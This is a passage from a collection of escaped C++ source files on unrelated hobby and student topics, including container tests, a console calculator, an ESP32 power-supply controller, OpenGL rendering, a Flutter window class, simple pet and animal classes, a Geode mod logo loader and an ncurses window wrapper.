std::list<T>::iterator it = list.begin(); it != list.end(); it++)\n    {\n        assert(*it == T());\n    }\n\n    for (typename ft::list<T>::iterator it = ft_list.begin(); it != ft_list.end(); it++)\n    {\n        assert(*it == T());\n    }\n}\n\nstatic void fill_constructor()\n{\n    test_fill_constructor_no_value<int>();\n    test_fill_constructor_no_value<float>();\n    test_fill_constructor_no_value<double>();\n    test_fill_constructor_no_value<std::string>();\n\n    test_fill_constructor_with_value<int>();\n    test_fill_constructor_with_value<float>();\n    test_fill_constructor_with_value<double>();\n    test_fill_constructor_with_value<std::string>();\n\n    display_success(\"fill constructor\");\n}\n\ntemplate <typename T>\nstatic void test_copy_constructor()\n{\n    std::list<T> list;\n    ft::list<T> ft_list;\n\n    list.insert(list.begin(), T());\n    ft_list.insert(ft_list.begin(), T());\n\n    assert(list.size() == 1);\n    assert(list.front() == T());\n\n    std::list<T> list_2(list);\n    ft::list<T> ft_list_2(ft_list);\n\n    assert(ft_list.size() == 1);\n    assert(ft_list.front() == T());\n\n    list_2.clear();\n    ft_list_2.clear();\n\n    assert(list_2.size() == 0);\n    assert(ft_list_2.size() == 0);\n}\n\nstatic void copy_constructor()\n{\n\n    test_copy_constructor<int>();\n    test_copy_constructor<float>();\n    test_copy_constructor<char>();\n    test_copy_constructor<char *>();\n    test_copy_constructor<std::string>();\n\n    display_success(\"copy constructor\");\n}\n\ntemplate <typename T>\nstatic void test_assignement()\n{\n    std::list<T> list;\n    ft::list<T> ft_list;\n\n    list.insert(list.begin(), T());\n    ft_list.insert(ft_list.begin(), T());\n\n    assert(list.size() == 1);\n    assert(ft_list.size() == 1);\n\n    std::list<T> new_list;\n    ft::list<T> new_ft_list;\n\n    new_list.insert(new_list.begin(), (size_t)2, T());\n    new_ft_list.insert(new_ft_list.begin(), (size_t)2, T());\n\n    list = new_list;\n    ft_list = new_ft_list;\n\n    assert(list.size() == 2);\n    assert(ft_list.size() == 2);\n}\n\nstatic void assignement_operator()\n{\n    test_assignement<int>();\n    test_assignement<float>();\n    test_assignement<double>();\n    test_assignement<char>();\n    test_assignement<std::string>();\n\n    display_success(\"assigment operator\");\n}\n\ntemplate <typename T>\nstatic void test_begin_end()\n{\n    size_t length = 50;\n    std::list<T> list;\n    ft::list<T> ft_list;\n\n    list.insert(list.begin(), length, T());\n    ft_list.insert(ft_list.begin(), length, T());\n\n    assert(list.size() == length);\n    assert(ft_list.size() == length);\n\n ",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <limits>\r\nusing namespace std;\r\n\r\nvoid clearScreen() {\r\n    #ifdef _WIN32\r\n        system(\"cls\");\r\n    #else\r\n        system(\"clear\");\r\n    #endif\r\n}\r\n\r\nvoid error_handle() {\r\n        cin.clear();\r\n        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n        cout << \"Invalid input. Please enter a valid number.\" << endl;\r\n}\r\n\r\nint main() {\r\n    char choice;\r\n    while (true) {\r\n        cout << \"Select an option:\" << endl;\r\n        cout << \"1. Addition\" << endl;\r\n        cout << \"2. Subtraction\" << endl;\r\n        cout << \"3. Multiplication\" << endl;\r\n        cout << \"4. Division\" << endl;\r\n        cout << \"5. Clear Screen\" << endl;\r\n        cout << \"6. Exit\" << endl;\r\n\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case '1': {\r\n\t\t\t\tint n;\r\n\t\t\t\twhile (true){\r\n\t\t\t\t\tcout << \"How many numbers do you want to add? \";\r\n\t\t\t\t\tcin >> n;\r\n\t\t\t\t\tif (cin.fail() || n < 0){\r\n\t\t\t\t\t\terror_handle();\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\t\t\t\t\t\r\n\t\t\t\tdouble sum = 0;\r\n\t\t\t\tdouble numbers[n];\r\n\t\t\t\tfor (int i = 0; i < n; i++) {\r\n\t\t\t\t\twhile(true){\r\n\t\t\t\t\t\tcout << \"Enter number \" << i + 1 << \": \";\r\n\t\t\t\t\t\tcin >> numbers[i];\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\tif(cin.fail()){\r\n                            error_handle();\r\n                        } else{\r\n                            break;\r\n                        }\r\n\t\t\t\t\t}\r\n\t\t\t\tsum += numbers[i];\r\n\t\t\t\t}\r\n\t\t\t\t\t\t\r\n\t\t\t\tcout << \"\\nSum: \" << sum << endl;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n    \r\n            \r\n\r\n            case '2': {\r\n                double a, b;\r\n                cout << \"Enter the first number: \";\r\n                cin >> a;\r\n                cout << \"Enter the second number: \";\r\n                cin >> b;\r\n                cout << \"Difference: \" << (a - b) << endl;\r\n                break;\r\n            }\r\n\r\n            case '3': {\r\n                int m;\r\n                while(true){\r\n\t\t\t\t\tcout << \"How many numbers do you want to multiply? \";\r\n\t\t\t\t\tcin >> m;\r\n\t\t\t\t\tif(cin.fail()){\r\n\t\t\t\t\t\terror_handle();\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n                double product = 1;\r\n                double numbers[m];\r\n                for (int i = 0; i < m; i++) {\r\n\t\t\t\t\twhile(true){\r\n\t\t\t\t\t\tcout << \"Enter number \" << i + 1 << \": \";\r\n\t\t\t\t\t\tcin >> numbers[i];\r\n\t\t\t\t\t\tif(cin.fail()){\r\n\t\t\t\t\t\t\terror_handle();\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse{\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t}\t\t\t\t\t\r\n\t\t\t\t\t}\r\n                    product *= numbers[i];\r\n                }\r\n                cout << \"Product: \" << product << endl;\r\n                break;\r\n            }\r\n\r\n            case '4': {\r\n                double x, y;\r\n                cout << \"Enter the numerator: \";\r\n                cin >> x;\r\n                cout << \"Enter the denominator: \";\r\n                cin >> y;\r\n                if (y == 0) {\r\n                    cout << \"Error: Division by zero is not allowed.\" << endl;\r\n                } else {\r\n                    cout << \"\\nQuotient: \" << (x / y) << endl;\r\n                }\r\n                break;\r\n            }\r\n\r\n            case '5': {\r\n                clearScreen();\r\n                break;\r\n            }\r\n\r\n            case '6': {\r\n                return 0;\r\n            }\r\n\r\n            default: {\r\n                cout << \"Invalid option. Please try again.\" << endl;\r\n            }\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "/*\n * Copyright (c) 2024 Tomosawa\n * https://github.com/Tomosawa/\n * All rights reserved\n */\n#include \"EventHandle.h\"\n#include \"GUIRender.h\"\n#include \"pmbus.h\"\n\nextern GUIRender guiRender;\nextern int displayPage;\nextern PMBus psu;\nextern WIFINetwork wifiNetwork;\n\nQueueHandle_t eventQueue;\nEventHandle::EventHandle()\n{\n}\n\nvoid EventHandle::eventTask(void *param)\n{\n    EventType event;\n    while (1)\n    {\n        if (xQueueReceive(eventQueue, &event, portMAX_DELAY))\n        {\n            // \u5904\u7406\u4e8b\u4ef6\n            switch (event)\n            {\n                case EVENT_POWERON:\n                    psu.on();\n                    break;\n                case EVENT_POWEROFF:\n                    psu.off();\n                    displayPage = 0;\n                    break;\n                case EVENT_SETSPEED:\n                    psu.writeFanCommand(guiRender.FanSpeed);\n                    break;\n                case EVENT_GETSPEED:\n                    guiRender.FanSpeed = psu.readFanCommand();\n                    break;\n                case EVENT_CONNECTWIFI:\n                    if(wifiNetwork.getWIFIState() == WL_CONNECTED)\n                        wifiNetwork.disconnectWIFI();\n                    if(wifiNetwork.ReadConfig())\n                        wifiNetwork.startWIFI();\n                    break;\n                case EVENT_DISCONNECTWIFI:\n                    wifiNetwork.disconnectWIFI();\n                    break;\n                case EVENT_SAVEWIFI:\n                    wifiNetwork.SaveConfig();\n                    wifiNetwork.wifi_json = wifiNetwork.getAllSSIDJson();\n                    break;\n            }\n        }\n    }\n}\n\nvoid EventHandle::init()\n{\n    eventQueue = xQueueCreate(10, sizeof(EventType));\n    xTaskCreate(EventHandle::eventTask, \"EventTaskFunc\", 2048, NULL, 1, NULL);\n}\n\nvoid EventHandle::powerOn()\n{\n     // \u542f\u52a8\u7535\u6e90\n    EventType event = EVENT_POWERON;\n    xQueueSend(eventQueue, &event, portMAX_DELAY);\n}\n\nvoid EventHandle::powerOff()\n{\n     // \u5173\u95ed\u7535\u6e90\n    EventType event = EVENT_POWEROFF;\n    xQueueSend(eventQueue, &event, portMAX_DELAY);\n}\n\nvoid EventHandle::setSpeed(int value)\n{\n    guiRender.FanSpeed = value;\n    EventType event = EVENT_SETSPEED;\n    xQueueSend(eventQueue, &event, portMAX_DELAY);\n}\n\nvoid EventHandle::getSpeed()\n{\n    EventType event = EVENT_GETSPEED;\n    xQueueSend(eventQueue, &event, portMAX_DELAY);\n}\n\nvoid EventHandle::connectWifi()\n{\n    EventType event = EVENT_CONNECTWIFI;\n    xQueueSend(eventQueue, &event, portMAX_DELAY);\n}\n\nvoid EventHandle::disConnectWifi()\n{\n    EventType event = EVENT_DISCONNECTWIFI;\n    xQueueSend(eventQueue, &event, portMAX_DELAY);\n}\n\nvoid EventHandle::saveWifi()\n{\n    EventType event = EVENT_SAVEWIFI;\n    xQueueSend(eventQueue, &event, portMAX_DELAY);\n}\n\nEventHandle::~EventHandle()\n{\n   \n}",
    "#include <glm/gtc/type_ptr.hpp>\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n#include <SOIL2/stb_image.h>\n#include <vector>\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <iostream>\n#include <sstream>\n#include <fstream>\n#include <string>\n#include \"camera.hpp\"\n#include \"load.hpp\"\n#include \"light.hpp\"\n#include \"shadow.hpp\"\n#include \"world.hpp\"\n#define VAOS 2\nstatic GLuint vao[VAOS];\n#define PROGRAMS 3\nstatic GLuint program[PROGRAMS];\n#define OBJECTS 2\nstatic objLoader obj[OBJECTS];\n#define LIGHTS 1\nstatic Light light[LIGHTS];\n#define MATERIALS 1\nstatic Material material[MATERIALS];\n#define TEXTURES 2\nstatic GLuint tex[TEXTURES];\n\n// \u4f7f\u7528\u679a\u4e3e\u63d0\u9ad8\u53ef\u8bfb\u6027\n// \u6a21\u578b\nenum\n{\n\tCube,\n\tSphere\n};\n// \u7740\u8272\u5668\u7a0b\u5e8f\nenum\n{\n\tlightProgram,\n\tmainProgram,\n\tworldProgram\n};\nvoid init(GLFWwindow *window)\n{\n#include \"texList.txt\"\n\tfileloader(program[lightProgram], \"./resources/shaders/lightv.vs\", \"./resources/shaders/lightf.fs\");\n\tfileloader(program[mainProgram], \"./resources/shaders/mainv.vs\", \"./resources/shaders/mainf.fs\");\n\t// fileloader(program[worldProgram], \"./resources/shaders/world.vs\", \"./resources/shaders/world.fs\");\n\tfileloader(program[worldProgram], \"./resources/shaders/worldLight.vs\", \"./resources/shaders/worldLight.fs\");\n\tobjLoader(obj[Cube], \"./resources/models/block.obj\");\n\tobjLoader(obj[Sphere], \"./resources/models/sphere.obj\");\n\tLight(light[0], glm::vec4(1.0f, 1.0f, 1.0f, 0.2f), glm::vec3(1.0f, 1.0f, 1.0f), glm::vec3(1.0f, 1.0f, 1.0f), glm::vec3(5.0f, 4.0f, 5.0f), glm::vec3(0.0f, 0.0f, 0.0f));\n\tMaterial(material[0], glm::vec4(1.0f, 1.0f, 1.0f, 1.0f), glm::vec3(1.0f, 1.0f, 1.0f), glm::vec3(1.0f, 1.0f, 1.0f), 25.0f);\n\tupdateViewPort();\n\tglEnable(GL_DEPTH_TEST);\n\tglDepthFunc(GL_LESS);\n\n\tglfwGetFramebufferSize(window, &width, &height);\n}\nGLuint frames = 0;\nGLfloat elapsedTime = 0.0f;\n\nvoid fps(GLFWwindow *window)\n{\n\tframes++;\n\telapsedTime += deltaTime;\n\tif (elapsedTime >= 1.0f)\n\t{\n\t\tstd::stringstream ss;\n\t\tss << \"FPS: \" << frames;\n\t\tglfwSetWindowTitle(window, ss.str().c_str());\n\t\tframes = 0;\n\t\telapsedTime = 0.0f;\n\t}\n}\nvoid display()\n{\n\tfloat currentTime = glfwGetTime();\n\tglClearColor(0.3, 0.5, 0.4, 1.0);\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n\tglm::mat4 lmodel(1.0f);\n\tlmodel = glm::rotate(lmodel, glm::radians(currentTime) * 30, glm::vec3(0.0f, 1.0f, 0.0f));\n\tlmodel = glm::translate(lmodel, light[0].position);\n\tlmodel = glm::scale(lmodel, glm::vec3(0.2f, 0.2f, 0.2f));\n\tglUseProgram(program[lightProgram]);\n\tglBindVertexArray(obj[Cube].VAO);\n\tglUniformMatrix4fv(glGetUniformLocation(program[lightProgram], \"lmodel\"), 1, GL_FALSE, value_ptr(lmodel));\n\tglUniformMatrix4fv(glGetUniformLocation(program[lightProgram], \"view\"), 1, GL_FALSE, value_ptr(view));\n\tglUniformMatrix4fv(glGetUniformLocation(program[lightProgram], \"projection\"), 1, GL_FALSE, value_ptr(projection));\n\tglUniform1ui(glGetUniformLocation(program[lightProgram], \"CC\"), 2);\n\tglDrawElements(GL_TRIANGLES, obj[Cube].indices.size(), GL_UNSIGNED_INT, 0);\n\n\t// glUseProgram(program[mainProgram]);\n\t// glBindVertexArray(obj[Sphere].VAO);\n\t// glActiveTexture(GL_TEXTURE0);\n\t// glBindTexture(GL_TEXTURE_2D, tex[0]);\n\t// light->updateUniform(program[mainProgram]);\n\t// material->updateUniform(program[mainProgram]);\n\t// glUniform1i(glGetUniformLocation(program[mainProgram], \"fTex\"), 0);\n\t// glm::mat4 smodel = glm::translate(glm::mat4(1.0f), glm::vec3(3.0f, 4.0f, 0.0f));\n\t// glUniformMatrix4fv(glGetUniformLocation(program[mainProgram], \"lmodel\"), 1, GL_FALSE, glm::value_ptr(lmodel));\n\t// glUniformMatrix4fv(glGetUniformLocation(program[mainProgram], \"model\"), 1, GL_FALSE, glm::value_ptr(smodel));\n\t// glUniformMatrix4fv(glGetUniformLocation(program[mainProgram], \"view\"), 1, GL_FALSE, glm::value_ptr(view));\n\t// glUniformMatrix4fv(glGetUniformLocation(program[mainProgram], \"projection\"), 1, GL_FALSE, glm::value_ptr(projection));\n\t// glDrawElements(GL_TRIANGLES, obj[Sphere].indices.size(), GL_UNSIGNED_INT, 0);\n\n\t// glUseProgram(program[worldProgram]);\n\tglUseProgram(program[worldProgram]);\n\tglBindVertexArray(worldVAO);\n\tglActiveTexture(GL_TEXTURE1);\n\tglBindTexture(GL_TEXTURE_2D, tex[stone]);\n\tglUniform1i(glGetUniformLocation(program[worldProgram], \"fTex\"), 1);\n\t// glUniform1i(glGetUniformLocation(program[worldProgram], \"fTex\"), 1);\n\t// glUniformMatrix4fv(glGetUniformLocation(program[worldProgram], \"view\"), 1, GL_FALSE, glm::value_ptr(view));\n\t// glUniformMatrix4fv(glGetUniformLocation(program[worldProgram], \"projection\"), 1, GL_FALSE, glm::value_ptr(projection));\n\tlight->updateUniform(program[worldProgram]);\n\tmaterial->updateUniform(program[worldProgram]);\n\tglm::mat4 smodel = glm::translate(glm::mat4(1.0f), glm::vec3(0.0f, 0.0f, 0.0f));\n\tglUniformMatrix4fv(glGetUniformLocation(program[worldProgram], \"lmodel\"), 1, GL_FALSE, glm::value_ptr(lmodel));\n\tglUniformMatrix4fv(glGetUniformLocation(program[worldProgram], \"model\"), 1, GL_FALSE, glm::value_ptr(smodel));\n\tglUniformMatrix4fv(glGetUniformLocation(program[worldProgram], \"view\"), 1, GL_FALSE, glm::value_ptr(view));",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Dog.cpp                                            :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: plashkar <marvin@42.fr>                    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/08/06 14:39:13 by plashkar          #+#    #+#             */\n/*   Updated: 2024/08/06 14:56:46 by plashkar         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Dog.hpp\"\n\nDog::Dog() : Animal(\"Dog\")\n{\n\tstd::cout << \"Dog: Constructor for \" << _type << \" called\" << std::endl;\n}\n\nDog::Dog(const Dog& otherDog) : Animal(otherDog)\n{\n\tstd::cout << \"Dog: Copy constructor for \" << _type << \" called\" << std::endl;\n}\n\n/**\n * Calling Base Class Assignment Operator: Ensures that the base class part of the object\n * is correctly assigned when implementing the assignment operator for a derived class.\n */\nDog&\tDog::operator=(const Dog& otherDog)\n{\n\tif (this != &otherDog)\n\t{\n\t\tAnimal::operator=(otherDog);\n\t\tstd::cout << \"Dog: Assignment operator called for \" << _type << \" called\" << std::endl;\n\t}\n\treturn *this;\n}\n\nDog::~Dog()\n{\n\tstd::cout << \"Dog: Deconstructor for \" << _type << \" called\" << std::endl;\n}\n\nvoid\tDog::makeSound( void ) const\n{\n\tstd::cout << \"Woof Woof \ud83d\udc36\" << std::endl;\n}\n",
    "#include \"Pet.h\"\nvoid Pet::setName(string inName){\n    petName = inName;\n  }\nvoid Pet::setType(string inType){\n    petType = inType;\n  }\nstring Pet::getName(){\n    return petName;\n}\nstring Pet::getType(){\n  return petType;\n}\nvoid Pet::setMood(int m){\n  moodbar = m;\n}\nvoid Pet::setHunger(int h){\n  hungerbar = h;\n}\nvoid Pet::setSleep(int s){\n  sleepbar = s;\n}\n\nint Pet::GetMood(){\n  return moodbar;\n}\nint Pet::GetHunger(){\n  return hungerbar;\n}\nint Pet::GetSleep(){\n  return sleepbar;\n}\nvoid Pet::AddMood(int m){\n  moodbar += m;\n  cout << \"Mood changed by \" << m << endl;\n  if (moodbar < 5){\n    cout << \"Mood too low. Too sad and died >:(\" << endl;\n  }\n}\nvoid Pet::AddHunger(int h){\n  hungerbar += h;\n  setHunger(hungerbar);\n  cout << \"Fullness changed by \" << h << endl;\n  if (hungerbar < 5){\n    cout << \"Starved to death.\" << endl;\n  }\n}\nvoid Pet::AddSleep(int s){\n  sleepbar += s;\n  setSleep(sleepbar);\n  cout << \"Rest changed by \" << s << endl;\n  if (sleepbar < 5){\n    cout << \"Didn't sleep enough. So sleeping forever now. Crashed from exhaustion.\" << endl;\n  }\n}\nvoid Pet::PrintStatus(){\n  cout << getName() << \", the \" << getType() \n          << \"\\nMood Status: \" << GetMood() << \"\\nHunger Status: \" << GetHunger() << \"\\nSleep Status: \" << GetSleep() << endl;\n        cout << \"----------------------\" << endl;\n}\nvoid Pet::OutStatus(){\n  cout << \"\\nMood Status: \" << GetMood() << \"\\nHunger Status: \" << GetHunger() << \"\\nSleep Status: \" << GetSleep() << endl;\n        cout << \"----------------------\" << endl;\n}",
    "#include <Geode/Geode.hpp>\n#include <Geode/ui/GeodeUI.hpp>\n#include <Geode/utils/web.hpp>\n\nusing namespace geode::prelude;\n\n#define public_cast(value, member) [](auto* v) { \\\n\tclass FriendClass__; \\\n\tusing T = std::remove_pointer<decltype(v)>::type; \\\n\tclass FriendeeClass__: public T { \\\n\tprotected: \\\n\t\tfriend FriendClass__; \\\n\t}; \\\n\tclass FriendClass__ { \\\n\tpublic: \\\n\t\tauto& get(FriendeeClass__* v) { return v->member; } \\\n\t} c; \\\n\treturn c.get(reinterpret_cast<FriendeeClass__*>(v)); \\\n}(value)\n\nclass ModLogoLoader : public CCNode {\npublic:\n    EventListener<web::WebTask> m_listener;\n    Mod* m_mod;\n    Ref<CCNode> m_node = nullptr;\n    Ref<LoadingCircleSprite> m_loadinc = nullptr;\n    int m_methodID = 0;\n    auto static attach(Mod* mod, CCNode* node = nullptr, int methodID = 0) {\n        auto loader = new ModLogoLoader;\n        loader->init();\n        loader->setID(\"loader\"_spr);\n        loader->m_mod = (mod);\n        loader->m_node = node ? node : geode::createModLogo(mod);\n        loader->m_methodID = (methodID);\n        auto na_label = loader->m_node->getChildByID(\"sprite\");\n        if (typeinfo_cast<CCLabelBMFont*>(na_label)) {\n            loader->m_loadinc = LoadingCircleSprite::create();\n            loader->m_loadinc->setLayoutOptions(AnchorLayoutOptions::create()->setAnchor(Anchor::Center));\n            loader->m_loadinc->fadeInCircle(0);\n            loader->m_loadinc->setScale(0.7f);\n            loader->m_node->addChild(loader->m_loadinc);\n            loader->m_node->updateLayout();\n            loader->request();\n        }\n        loader->m_node->addChild(loader);\n        return loader->m_node;\n    }\n    void request() {\n        auto repo = m_mod->getMetadata().getRepository().value_or(\"\");\n        auto raw = string::replace(repo,\n            \"https://github.com/\", \"https://raw.githubusercontent.com/\"\n        );\n        auto url = std::string();\n        if (m_methodID == 0) {\n            url = raw + \"/\" + m_mod->getVersion().toString() + \"/logo.png\";\n        }\n        if (m_methodID == 1) {\n            url = raw + \"/main/logo.png\";\n        }\n        if (m_methodID == 2) {\n            url = raw + \"/master/logo.png\";\n        }\n        if (m_methodID == 3) {\n            url = \"https://api.geode-sdk.org/v1/mods/\" + m_mod->getID() + \"/logo\";\n        }\n        m_listener.bind(\n            [this](web::WebTask::Event* e) {\n                if (web::WebResponse* res = e->getValue())\n                    response(res);\n            }\n        );\n        auto req = web::WebRequest();\n        m_listener.setFilter(req.get(url));\n    };\n    void response(web::WebResponse* res) {\n        if (this == nullptr) return;\n        if (this->m_node == nullptr) return;\n        auto& rtn = this->m_node;\n\n        auto str = res->string().value_or(\"NO_DATA\");\n        str = res->string().error_or(str);\n\n        if ((res->code() < 399) and (res->code() > 10)) {\n\n            if (auto na_label = rtn->getChildByID(\"sprite\"))\n                na_label->removeFromParentAndCleanup(0);\n\n            auto error_code = std::error_code();\n            auto path = dirs::getTempDir() / (m_mod->getID() + \".temp.logo.png\");\n\n            std::ofstream(path, std::ios::binary) << str;\n            auto sprite = CCSprite::create(path.string().c_str());\n            std::filesystem::remove(path, error_code);\n\n            if (dynamic_cast<CCSprite*>(sprite) and dynamic_cast<CCNode*>(sprite)) {\n                sprite->setLayoutOptions(AnchorLayoutOptions::create()->setAnchor(Anchor::Center));\n                sprite->setScale(rtn->getContentSize().width / sprite->getContentSize().width);\n                rtn->addChild(sprite);\n                rtn->updateLayout();\n            };\n        }\n        else {\n            log::error(\"code: {}, err: {}\",\n                res->code(), res->string().error_or(str)\n            );\n            m_methodID = m_methodID + 1;\n            if (m_methodID <= 3) return request();\n        }\n\n        if (m_loadinc) m_loadinc->setVisible(0);\n    }\n};\n\nstatic auto loaderMod = Loader::get()->getLoadedMod(\"geode.loader\");\n\nclass ModPopup : public FLAlertLayer {};\nclass ModItem : public CCNode {};\n\nclass ModSource {};\nclass ModListSource {\npublic:\n    struct LoadPageError {\n        std::string message;\n        std::optional<std::string> details;\n\n        LoadPageError() = default;\n        LoadPageError(std::string const& msg) : message(msg) {}\n        LoadPageError(auto msg, auto details) : message(msg), details(details) {}\n    };\n\n    using Page = std::vector<Ref<ModItem>>;\n    using PageLoadTask = Task<Result<Page, LoadPageError>, std::optional<uint8_t>>;\n\n    struct ProvidedMods {\n        std::vector<ModSource> mods;\n        size_t totalModCount;\n    };\n    using ProviderTask = Task<Result<ProvidedMods, LoadPageError>, std::optional<uint8_t>>;\n\n    std::unordered_map<size_t, Page> m_cachedPages;\n    std::optional<size_t> m_cachedItemCount;\n\n    virtual void resetQuery() = 0;\n    virtual ProviderTask fetchPage(size_t page, size_t pageSi",
    "#include \"window/window.h\"\n#include \"window/flags.h\"\n#include <ncurses.h>\n\n#define DEFAULT_FPS 60\n\nWindow::Window(const int w, const int h, const int flags)\n   :  w(w),\n      h(h),\n      target_fps(DEFAULT_FPS),\n      flags(flags)\n{\n   // initialise ncurses\n   initscr();\n   raw();\n   noecho();\n   cbreak();\n   curs_set(false);\n   keypad(stdscr, true);\n   nodelay(stdscr, true);\n\n   // create the ncurses window pointer\n   this->nc_window = newwin(w, h, 0, 0);\n}\n\nWindow::~Window() {\n   close();\n}\n\nint Window::getWidth() const { return this->w; }\nint Window::getHeight() const { return this->h; }\n\nvoid Window::setTargetFPS(int fps) {\n   this->target_fps = fps;\n}\n\nvoid Window::close() {\n   delwin(this->nc_window);\n   this->nc_window = nullptr;\n   endwin();\n}\n\n/* This function will refresh your screen at a \n * fixed framerate so the changes can actually \n * be visible and not clear immediately.\n*/\nvoid Window::refresh() {\n   // activate the window flags\n   if (WINDOW_BORDER & this->flags)\n      box(this->nc_window, 0, 0);\n\n   // We have this specific order to avoid flickering\n   timeout(1 / this->target_fps); // wait 1/<target_fps>ms to improve performance\n   wrefresh(this->nc_window);\n   werase(this->nc_window); // clear the screen for the next operation\n}\n",
